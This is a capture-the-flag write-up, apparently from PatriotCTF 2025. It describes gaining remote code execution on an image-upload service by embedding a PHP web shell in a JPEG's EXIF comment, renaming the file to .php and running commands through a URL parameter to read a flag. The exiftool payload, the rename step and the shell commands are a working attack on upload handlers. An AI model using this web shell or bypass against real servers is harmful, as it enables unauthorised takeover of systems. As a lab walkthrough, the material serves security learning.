
misc
## 1. Overview

The target was a web application running on port `9090` that allowed users to upload image files. The application verified the file header (Magic Bytes) to ensure it was an image but failed to sanitize metadata or strictly enforce file extensions. This allowed for a **Metadata Polyglot Attack** leading to **Remote Code Execution (RCE)**.

## 2. Reconnaissance

- **Discovery:** Found an upload form at `http://18.212.136.134:9090/`.
    
- **Behavior:** The server accepted image uploads (JPG/PNG) and displayed them.
    
- **Vulnerability Detection:** We suspected the server was parsing metadata (EXIF) without sanitization.
    

## 3. Exploitation

We used a "Polyglot" file—a valid JPEG image that contained hidden PHP code in its metadata tags.

### Step 1: Payload Creation

Using `exiftool`, we injected a PHP web shell into the `Comment` tag of a standard image.

**Command:**

Bash

```
exiftool -Comment='<?php system($_GET["cmd"]); ?>' cat.jpg
```

### Step 2: Extension Bypass

The server checked if the file _started_ like an image (Magic Bytes `FF D8 FF`) but allowed the file extension to be changed. We renamed the file to force the server to process it as a PHP script.

**Command:**

Bash

```
mv cat.jpg cat.php
```

### Step 3: Execution

We uploaded `cat.php`. The server accepted it because of the valid JPEG header. We then accessed the file via the browser, passing commands through the `cmd` parameter.

**URL:** `http://18.212.136.134:9090/uploads/cat.php?cmd=id`

**Response:** The server executed the embedded PHP code and returned: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

## 4. Flag Capture

With RCE established, we enumerated the file system.

1. **Located Flag Directory:** `?cmd=ls -la /` _Result:_ Found a non-standard directory named `/flags`.
    
2. **Located Flag File:** `?cmd=ls -la /flags` _Result:_ Found `root.txt`.
    
3. **Retrieved Flag:** `?cmd=cat /flags/root.txt`
    

**Final Flag:** `MASONCC{images_give_us_bash?}`

[[PatriotCTF-2025]]